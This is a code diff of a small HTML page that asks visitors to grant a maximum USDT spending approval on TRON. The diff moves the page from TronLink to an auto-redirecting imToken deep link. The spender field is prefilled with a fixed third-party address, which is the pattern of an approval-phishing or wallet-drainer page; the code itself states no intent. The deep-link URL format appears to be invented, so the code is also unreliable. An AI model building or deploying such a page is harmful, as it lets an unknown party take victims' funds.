@@ -2,68 +2,69 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>TRON USDT 默认授权</title>
+  <title>TRON USDT Max Approval - IMToken</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
-    body { font-family: Arial; padding: 20px; background: #f6f6f6; }
-    input, button { padding: 8px; margin: 5px 0; width: 100%; }
-    button { cursor: pointer; }
-    #status { margin-top: 10px; font-weight: bold; }
+    body { font-family: Arial, sans-serif; padding: 20px; background: #f6f6f6; }
+    label { display: block; margin-top: 10px; }
+    input, button { padding: 8px; margin: 5px 0; width: 100%; box-sizing: border-box; }
+    button { cursor: pointer; background: #007bff; color: white; border: none; border-radius: 4px; }
+    button:hover { background: #0056b3; }
+    #status { margin-top: 15px; font-weight: bold; word-break: break-all; }
   </style>
 </head>
 <body>
 
-<h2>TRON USDT 默认授权页面</h2>
+<h2>TRON USDT Max Approval (IMToken)</h2>
 
-<label>合约地址:</label>
+<label for="contractAddress">Contract Address:</label>
 <input type="text" id="contractAddress" value="TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t">
 
-<label>授权地址:</label>
+<label for="spenderAddress">Spender Address:</label>
 <input type="text" id="spenderAddress" value="TGyztuTE8f4FJte4JZ1VRDpEKYpKMAuQey">
 
-<button id="approveBtn">授权最大额度</button>
+<button id="approveBtn">Authorize Max via IMToken</button>
 
 <div id="status"></div>
 
 <script>
-const MAX_APPROVAL = 9999999; // 默认最大授权额度
+const MAX_APPROVAL = 9999999;
 
-async function waitForTronWeb() {
-  while (!window.tronWeb || !tronWeb.ready) {
-    document.getElementById('status').innerText = '等待 TronLink 登录...';
-    await new Promise(resolve => setTimeout(resolve, 500));
-  }
-  document.getElementById('status').innerText = 'TronLink 已登录!';
+// Generate IMToken deep link
+function generateIMTokenLink(contractAddress, spender, amount) {
+  // IMToken TRON DApp URL format
+  const base = 'imtokenv2://navigate/dapp/'; // DApp Browser
+  const params = {
+    type: 'tron',              // network
+    contract: contractAddress, // contract
+    method: 'approve',         // method
+    args: JSON.stringify([spender, amount])
+  };
+  
+  const query = Object.keys(params).map(k => `${k}=${encodeURIComponent(params[k])}`).join('&');
+  return base + '?' + query;
 }
 
-async function approveMax() {
-  const contractAddress = document.getElementById('contractAddress').value;
-  const spender = document.getElementById('spenderAddress').value;
+function approveViaIMToken() {
+  const contractAddress = document.getElementById('contractAddress').value.trim();
+  const spender = document.getElementById('spenderAddress').value.trim();
+  const statusEl = document.getElementById('status');
 
   if (!contractAddress || !spender) {
-    alert('请填写完整信息');
+    alert('Please fill in both contract and spender addresses.');
     return;
   }
 
-  try {
-    const contract = await tronWeb.contract().at(contractAddress);
-    const value = tronWeb.toSun(MAX_APPROVAL); // 固定最大值，钱包弹窗默认显示
+  const link = generateIMTokenLink(contractAddress, spender, MAX_APPROVAL);
 
-    document.getElementById('status').innerText = '等待交易签名...';
-
-    const tx = await contract.approve(spender, value).send({
-      feeLimit: 100_000_000,
-      callValue: 0
-    });
-
-    document.getElementById('status').innerText = '授权成功！交易ID: ' + tx;
-  } catch (e) {
-    console.error(e);
-    document.getElementById('status').innerText = '交易失败: ' + e.message;
-  }
+  statusEl.innerHTML = `Click the link to open IMToken and authorize:<br><a href="${link}">Open IMToken</a>`;
+  
+  // Optional: auto redirect for mobile
+  window.location.href = link;
 }
 
-waitForTronWeb();
-document.getElementById('approveBtn').addEventListener('click', approveMax);
+// Attach event
+document.getElementById('approveBtn').addEventListener('click', approveViaIMToken);
 </script>
 
 </body>
